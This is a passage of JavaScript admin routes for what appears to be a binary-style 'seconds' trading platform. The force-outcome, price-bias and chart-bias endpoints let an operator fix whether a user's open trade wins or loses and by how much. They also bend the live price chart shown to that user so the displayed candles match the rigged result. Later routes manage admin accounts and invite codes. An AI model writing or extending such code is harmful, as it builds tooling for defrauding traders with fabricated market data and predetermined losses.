  "/seconds-trades/:id/force-outcome",
  requireDatabase,
  [
    body("outcome")
      .isIn(["win", "loss", "clear"])
      .withMessage("outcome must be win, loss, or clear."),
    body("amount").optional({ nullable: true }).isFloat(),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    if (!mongoose.isValidObjectId(req.params.id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid trade id.",
      });
    }

    const trade = await SecondsTrade.findById(req.params.id);
    if (!trade || !assertTenantDoc(req, trade)) {
      return res.status(404).json({
        success: false,
        error: "NotFoundError",
        message: "Trade not found.",
      });
    }

    if (trade.status === "won" || trade.status === "lost" || trade.status === "cancelled") {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Trade is already settled.",
        trade: serializeAdminTrade(trade),
      });
    }

    // Never settle here — only stamp outcome; timer must reach 0
    if (trade.status === "settling") {
      trade.status = "open";
    }

    if (req.body.outcome === "clear") {
      trade.forcedOutcome = null;
      trade.forcedAmount = null;
      trade.priceBiasPercent = 0;
      await trade.save();
      return res.json({
        success: true,
        message: "Forced outcome cleared. Timer continues.",
        trade: serializeAdminTrade(trade),
      });
    }

    const rawAmt = req.body.amount;
    if (rawAmt == null || rawAmt === "" || !Number.isFinite(parseFloat(rawAmt))) {
      return res.status(422).json({
        success: false,
        error: "ValidationError",
        message:
          "Enter a Manual Balance Add amount for Force WIN (profit) or Force LOSS (loss slice).",
      });
    }

    trade.forcedOutcome = req.body.outcome;
    trade.forcedAmount = parseFloat(rawAmt);
    // Direction-aware: WIN+long↑ WIN+short↓ LOSS+long↓ LOSS+short↑
    // Seed ~0.45% so the user chart moves immediately (ramp still climbs to ~1.6%)
    const seed = signedBiasForOutcome(trade.direction, req.body.outcome, 0.45);
    trade.priceBiasPercent = seed;
    await trade.save();

    const user = await User.findById(trade.user);
    if (user) {
      if (!user.chartBias) user.chartBias = new Map();
      user.chartBias.set(trade.asset, seed);
      user.markModified("chartBias");
      await user.save();
    }

    const remSec = Math.max(
      0,
      Math.ceil((new Date(trade.expiresAt).getTime() - Date.now()) / 1000)
    );
    const absAmt = Math.abs(parseFloat(trade.forcedAmount));

    return res.json({
      success: true,
      message:
        req.body.outcome === "win"
          ? `Force WIN locked · +$${absAmt} profit at 0s · timer ${remSec}s`
          : `Force LOSS locked · −$${absAmt} from stake at 0s · timer ${remSec}s`,
      trade: serializeAdminTrade(trade, user),
      wallet:
        user?.wallet instanceof Map
          ? Object.fromEntries(user.wallet)
          : { ...(user?.wallet || {}) },
    });
  })
);

// PUT /seconds-trades/:id/price-bias — Graph UP / DOWN for this trade session
router.put(
  "/seconds-trades/:id/price-bias",
  requireDatabase,
  [
    body("direction")
      .isIn(["up", "down", "reset"])
      .withMessage("direction must be up, down, or reset."),
    body("step").optional().isFloat({ gt: 0, max: 10 }),
    body("amount").optional({ nullable: true }).isFloat(),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    if (!mongoose.isValidObjectId(req.params.id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid trade id.",
      });
    }

    const trade = await SecondsTrade.findById(req.params.id);
    if (
      !trade ||
      !assertTenantDoc(req, trade) ||
      (trade.status !== "open" && trade.status !== "settling")
    ) {
      return res.status(404).json({
        success: false,
        error: "NotFoundError",
        message: "Open trade not found.",
      });
    }

    // Graph HIGH / LOW — price direction + outcome derived from trade side.
    // Candles drift gradually; trade settles only when timer hits 0.
    const goingUp = req.body.direction === "up";
    const goingDown = req.body.direction === "down";

    if (req.body.direction === "reset") {
      trade.priceBiasPercent = 0;
      trade.forcedOutcome = null;
      trade.forcedAmount = null;
    } else if (goingUp || goingDown) {
      trade.forcedOutcome = outcomeFromGraphDirection(
        trade.direction,
        req.body.direction
      );
      trade.priceBiasPercent = signedBiasForGraph(req.body.direction, 0.08);
    }

    // Optional Manual Balance Add from live card (precise float)
    if (
      (goingUp || goingDown) &&
      req.body.amount != null &&
      req.body.amount !== "" &&
      Number.isFinite(parseFloat(req.body.amount))
    ) {
      trade.forcedAmount = parseFloat(req.body.amount);
    }

    // Never settle early — reopen if stuck mid-settle so timer can finish
    if (trade.status === "settling") trade.status = "open";
    await trade.save();

    // Mirror onto user chartBias so the live chart drifts for this asset.
    const user = await User.findById(trade.user);
    if (user) {
      if (!user.chartBias) user.chartBias = new Map();
      if (req.body.direction === "reset") {
        user.chartBias.set(trade.asset, 0);
      } else {
        user.chartBias.set(trade.asset, Number(trade.priceBiasPercent || 0));
      }
      user.markModified("chartBias");
      await user.save();
    }

    const remSec = Math.max(
      0,
      Math.ceil((new Date(trade.expiresAt).getTime() - Date.now()) / 1000)
    );
    const outcomeLabel = trade.forcedOutcome
      ? trade.forcedOutcome.toUpperCase()
      : "CLEAR";
    const label = goingUp
      ? `Graph HIGH · ${outcomeLabel} · candles rising · settles in ${remSec}s`
      : goingDown
        ? `Graph LOW · ${outcomeLabel} · candles falling · settles in ${remSec}s`
        : "Graph bias reset.";

    res.json({
      success: true,
      message: label,
      trade: serializeAdminTrade(trade, user),
      chartBias: user?.chartBias
        ? Object.fromEntries(user.chartBias)
        : {},
      wallet:
        user?.wallet instanceof Map
          ? Object.fromEntries(user.wallet)
          : { ...(user?.wallet || {}) },
    });
  })
);

// PUT /users/:id/chart-bias — direct user-level chart control
router.put(
  "/users/:id/chart-bias",
  requireDatabase,
  [
    body("symbol").isString().trim().isLength({ min: 2, max: 12 }),
    body("direction").isIn(["up", "down", "reset"]),
    body("step").optional().isFloat({ gt: 0, max: 10 }),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    if (!mongoose.isValidObjectId(req.params.id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid user id.",
      });
    }

    const scoped = await assertTenantUser(req, req.params.id);
    if (scoped.status) {
      return res.status(scoped.status).json({
        success: false,
        error: scoped.status === 404 ? "NotFoundError" : "BadRequestError",
        message: scoped.message,
      });
    }
    const user = scoped.user;

    const symbol = String(req.body.symbol).toUpperCase();
    const step = Number(req.body.step) || 0.35;
    if (!user.chartBias) user.chartBias = new Map();
    const cur = Number(user.chartBias.get(symbol) || 0);

    if (req.body.direction === "reset") user.chartBias.set(symbol, 0);
    else if (req.body.direction === "up")
      user.chartBias.set(symbol, cur + step);
    else user.chartBias.set(symbol, cur - step);

    await user.save();

    res.json({
      success: true,
      chartBias: Object.fromEntries(user.chartBias),
      symbol,
      value: user.chartBias.get(symbol),
    });
  })
);

// ---------------------------------------------------------------------------
// SUPER ADMIN — Admin Manager suite
// ---------------------------------------------------------------------------
const sanitizeAdmin = (u) => {
  const obj = u.toObject ? u.toObject({ virtuals: true }) : { ...u };
  delete obj.password;
  delete obj.__v;
  if (obj.wallet instanceof Map) obj.wallet = Object.fromEntries(obj.wallet);
  obj.id = obj._id?.toString?.() || obj._id;
  return obj;
};

router.get(
  "/managers",
  requireDatabase,
  requireSuperAdmin,
  asyncHandler(async (_req, res) => {
    const admins = await User.find({
      role: ROLES.ADMIN,
      deletedAt: null,
    })
      .sort({ createdAt: -1 })
      .limit(500);

    const withCounts = await Promise.all(
      admins.map(async (a) => {
        const [userCount, archivedUsers, openTrades, pendingTx, chatThreads] =
          await Promise.all([
            User.countDocuments({
              adminId: a._id,
              role: "user",
              deletedAt: null,
            }),
            User.countDocuments({
              adminId: a._id,
              role: "user",
              deletedAt: { $ne: null },
            }),
            SecondsTrade.countDocuments({ adminId: a._id, status: "open" }),
            Transaction.countDocuments({
              adminId: a._id,
              status: "pending",
              kind: { $in: ["deposit", "withdrawal"] },
            }),
            Message.distinct("user", { adminId: a._id }).then((ids) => ids.length),
          ]);
        return {
          ...sanitizeAdmin(a),
          stats: {
            userCount,
            archivedUsers,
            openTrades,
            pendingTx,
            chatThreads,
          },
        };
      })
    );

    return res.json({ success: true, admins: withCounts });
  })
);

router.post(
  "/managers",
  requireDatabase,
  requireSuperAdmin,
  [
    body("fullName").trim().isLength({ min: 2, max: 80 }),
    body("username")
      .trim()
      .matches(/^[a-zA-Z0-9_.-]{3,24}$/),
    body("email").trim().isEmail().normalizeEmail(),
    body("password")
      .isLength({ min: 8, max: 128 })
      .withMessage("Password must be at least 8 characters."),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const { fullName, username, email, password } = req.body;
    const clash = await User.findOne({
      $or: [{ email }, { username: username.toLowerCase() }],
    }).lean();
    if (clash) {
      return res.status(409).json({
        success: false,
        error: "ConflictError",
        message: "An account with that email or username already exists.",
      });
    }

    const hashed = await bcrypt.hash(password, 12);
    const admin = await User.create({
      fullName,
      username: username.toLowerCase(),
      email,
      password: hashed,
      role: ROLES.ADMIN,
      adminId: null,
      banned: false,
    });
    admin.adminId = admin._id;
    await admin.save();

    // Seed one single-use invite for this admin's first user
    const seedCode = randomCode(8);
    await InviteCode.create({
      code: seedCode,
      role: "user",
      maxUses: 1,
      createdBy: req.auth.sub,
      adminId: admin._id,
      notes: `Starter single-use code for @${admin.username}`,
    });

    return res.status(201).json({
      success: true,
      message: "Admin account created.",
      admin: sanitizeAdmin(admin),
      starterInviteCode: seedCode,
    });
  })
);

router.put(
  "/managers/:id/ban",
  requireDatabase,
  requireSuperAdmin,
  asyncHandler(async (req, res) => {
    const { id } = req.params;
    if (!mongoose.isValidObjectId(id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid admin id.",
      });
    }
    const admin = await User.findById(id);
    if (!admin || admin.role !== ROLES.ADMIN) {
      return res.status(404).json({
        success: false,
        error: "NotFoundError",
        message: "Admin not found.",
      });
    }
    if (String(admin._id) === String(req.auth.sub)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "You cannot suspend your own account.",
      });
    }
    const nextBanned =
      typeof req.body.banned === "boolean" ? req.body.banned : !admin.banned;
    admin.banned = nextBanned;
    await admin.save();
    return res.json({
      success: true,
      message: nextBanned ? "Admin suspended." : "Admin reactivated.",
      admin: sanitizeAdmin(admin),
    });
  })
);

router.put(
  "/managers/:id",
  requireDatabase,
  requireSuperAdmin,
  [
    body("fullName").optional().trim().isLength({ min: 2, max: 80 }),
    body("password").optional().isLength({ min: 8, max: 128 }),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const { id } = req.params;
    if (!mongoose.isValidObjectId(id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid admin id.",
      });
    }
    const admin = await User.findById(id).select("+password");
    if (!admin || admin.role !== ROLES.ADMIN) {
      return res.status(404).json({
        success: false,
        error: "NotFoundError",
        message: "Admin not found.",
      });
    }
    if (req.body.fullName) admin.fullName = req.body.fullName.trim();
    if (req.body.password) {
      admin.password = await bcrypt.hash(req.body.password, 12);
    }
    await admin.save();
    return res.json({
      success: true,
      message: "Admin updated.",
      admin: sanitizeAdmin(admin),
    });
  })
);

export default router;

